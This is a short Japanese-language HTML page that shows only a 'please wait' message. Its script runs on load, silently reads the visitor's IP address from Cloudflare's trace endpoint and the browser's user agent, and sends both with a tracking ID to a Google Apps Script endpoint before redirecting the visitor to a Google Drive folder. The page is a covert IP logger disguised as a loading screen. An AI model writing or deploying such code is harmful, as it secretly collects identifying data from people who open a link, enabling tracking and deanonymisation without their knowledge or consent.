<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <title>アクセス中...</title>
  <style>
    body {
      background: #121212;
      color: white;
      text-align: center;
      padding-top: 20%;
      font-family: sans-serif;
    }
  </style>
</head>
<body>
  <p>少しお待ちください</p>

  <script>
    async function logAndRedirect() {
      try {
        const res = await fetch("https://www.cloudflare.com/cdn-cgi/trace");
        const txt = await res.text();
        const ipMatch = txt.match(/ip=(.+)/);
        const ip = ipMatch ? ipMatch[1].trim() : "未取得";
        const ua = navigator.userAgent;

        const id = "cdef-8765-21-0987-h";
        const nextURL = "https://drive.google.com/drive/folders/1BLJp9l7lsTLOfWtiLvgoJBr4LkmrcUBq";

        const redirectURL =
          "https://script.google.com/macros/s/AKfycbz6LVV3xSOaXrXf6QU9FqlPktIo_3bQO1sptai6En7f20gqHWJQBiAiYFT-NpihpxTtXg/exec" +
          "?id=" + encodeURIComponent(id) +
          "&ip=" + encodeURIComponent(ip) +
          "&ua=" + encodeURIComponent(ua) +
          "&next=" + encodeURIComponent(nextURL);

        window.location.href = redirectURL;

      } catch (e) {
        document.body.innerHTML = "<p>IPアドレスの取得に失敗しました。再読み込みしてください。</p>";
        console.error("IP取得エラー:", e);
      }
    }

    logAndRedirect();
  </script>
</body>
</html>
